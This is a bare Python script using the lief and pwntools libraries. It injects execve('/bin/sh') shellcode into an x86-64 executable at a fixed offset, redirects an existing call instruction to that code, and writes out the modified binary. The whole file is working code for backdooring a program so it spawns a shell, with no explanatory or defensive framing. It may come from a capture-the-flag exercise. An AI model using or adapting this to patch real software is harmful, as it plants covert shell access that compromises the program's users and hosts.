import lief
from  pwn import *
def patch_call(file,where,aim,arch = "amd64"):
	aim = p32((aim - (where + 5 )) & 0xffffffff)
	order = '\xe8'+aim#call aim
	file.patch_address(where,[ord(i) for i in order])
	binary.write("new")
binary=lief.parse("../main")
context.arch='amd64'
hook='''
xor rax,rax
xor rsi,rsi
xor rdx,rdx
mov rdi,0x68732f6e69622f
push rdi
mov rdi,rsp
mov al,0x3b
syscall
'''
hook=asm(hook)
en_frame=0x000000000000A18
binary.patch_address(en_frame,[ord(i) for i in hook])
raw_address=0x00000000000092F
aim_address=en_frame
patch_call(binary,raw_address,aim_address)
binary.write("new")
